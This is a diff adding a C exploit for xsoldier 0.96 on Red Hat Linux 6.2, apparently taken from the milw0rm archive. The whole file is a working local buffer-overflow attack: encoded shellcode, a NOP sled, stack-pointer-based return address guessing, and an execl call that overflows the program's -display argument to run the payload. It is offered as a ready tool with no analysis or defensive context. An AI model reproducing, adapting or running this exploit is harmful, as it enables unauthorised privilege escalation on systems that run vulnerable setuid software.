@@ -1,0 +1,48 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+#define NOP 0x90
+#define BUFSIZE 4408
+#define OFFSET 0 
+#define RANGE 20
+ 
+unsigned char blah[] =
+  "\xeb\x03\x5e\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc6\x0d\x31\xc9\xb1\x6c\x80\x36\x01\x46\xe2\xfa"
+  "\xea\x09\x2e\x63\x68\x6f\x2e\x72\x69\x01\x80\xed\x66\x2a\x01\x01"
+  "\x54\x88\xe4\x82\xed\x1d\x56\x57\x52\xe9\x01\x01\x01\x01\x5a\x80\xc2\xc7\x11"
+  "\x01\x01\x8c\xba\x1f\xee\xfe\xfe\xc6\x44\xfd\x01\x01\x01\x01\x88\x7c\xf9\xb9"
+  "\x47\x01\x01\x01\x30\xf7\x30\xc8\x52\x88\xf2\xcc\x81\x8c\x4c\xf9\xb9\x0a\x01"
+  "\x01\x01\x88\xff\x30\xd3\x52\x88\xf2\xcc\x81\x30\xc1\x5a\x5f\x5e\x88\xed\x5c"
+  "\xc2\x91";
+
+long get_sp () { __asm__ ("mov %esp, %eax"); }
+
+int
+main (int argc, char *argv[])
+{
+  char buffer[BUFSIZE];
+  int i, offset;
+  unsigned long ret;
+
+  if (argc > 1)
+    offset = atoi(argv[1]);
+  else
+    offset = OFFSET;
+
+  for (i = 0; i < (BUFSIZE - strlen (blah) - RANGE*2); i++)
+    *(buffer + i) = NOP;
+
+  memcpy (buffer + i, blah, strlen (blah));
+
+  ret = get_sp();	
+  for (i = i + strlen (blah); i < BUFSIZE; i += 4)
+    *(long *) &buffer[i] = ret+offset;
+
+  fprintf(stderr, "xsoldier-0.96 exploit for Red Hat Linux release 6.2 (Zoot)\n");
+  fprintf(stderr, "zorgon@antionline.org\n");		
+  fprintf(stderr, "[return address = %x] [offset = %d] [buffer size = %d]\n", ret + offset, offset, BUFSIZE);
+  execl ("./xsoldier", "xsoldier", "-display", buffer, 0);
+}
+
+
+// milw0rm.com [2000-12-15]
